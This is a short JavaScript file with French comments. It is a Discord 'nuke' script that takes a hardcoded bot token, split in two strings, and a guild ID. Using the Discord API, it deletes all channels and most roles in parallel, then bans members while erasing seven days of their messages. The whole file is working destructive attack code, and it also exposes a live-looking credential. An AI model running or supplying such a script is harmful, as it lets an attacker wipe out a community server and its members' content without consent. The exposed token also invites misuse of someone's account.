const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";

async function blitz() {
  console.log("démarrage du blitz...");

  // 1. supprimer tous les salons en même temps
  console.log("--- DESTRUCTION DES SALONS ---");
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  let delChannels = channels.map(c => fetch(`https://discord.com/api/v9/channels/${c.id}`, {
    method: "DELETE",
    headers: { "Authorization": `Bot ${botToken}` }
  }).catch(() => {}));
  
  await Promise.all(delChannels);
  console.log("salons détruits.");

  // 2. supprimer tous les rôles en même temps
  console.log("--- DESTRUCTION DES RÔLES ---");
  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  let delRoles = roles.map(r => {
    if (r.name === "@everyone" || r.managed) return Promise.resolve();
    return fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
      method: "DELETE",
      headers: { "Authorization": `Bot ${botToken}` }
    }).catch(() => {});
  });
  
  await Promise.all(delRoles);
  console.log("rôles détruits.");

  // 3. ban tout le monde en même temps (sauf le bot et le owner)
  console.log("--- BAN DES MEMBRES ---");
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  let banMembers = members.map(m => {
    if (m.user.bot || m.user.id === guild) return Promise.resolve(); // ignore les bots
    return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
      method: "PUT",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ delete_message_seconds: 604800 })
    }).catch(() => {});
  });
  
  await Promise.all(banMembers);
  console.log("membres bannis.");

  console.log("fin du blitz.");
}

blitz();